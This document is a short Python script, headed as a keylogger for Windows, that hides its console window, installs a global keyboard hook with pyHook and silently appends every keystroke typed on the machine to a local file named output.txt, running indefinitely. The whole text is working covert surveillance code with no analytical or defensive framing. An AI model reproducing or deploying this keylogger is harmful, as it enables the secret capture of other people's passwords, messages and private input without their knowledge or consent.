# Python code for keylogger 
# to be used in windows 
import win32api, os 
import win32console 
import win32gui 
import pyHook
import pythoncom
import logging

win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0) 
log = 'output.txt'
escape = {
    9: '\t',
    13: '\n'
    }
def OnKeyboardEvent(event):
    
    if event.Ascii >= 32:
        c = chr(event.Ascii)
        with open(log, 'a+') as f:
            f.write(c)
    elif event.Ascii in escape:
        with open(log, 'a+') as f:
            f.write(escape[event.Ascii])
    return True
# create a hook manager object 
hm = pyHook.HookManager() 
hm.KeyDown = OnKeyboardEvent 
# set the hook 
hm.HookKeyboard() 
# wait forever 
pythoncom.PumpMessages()
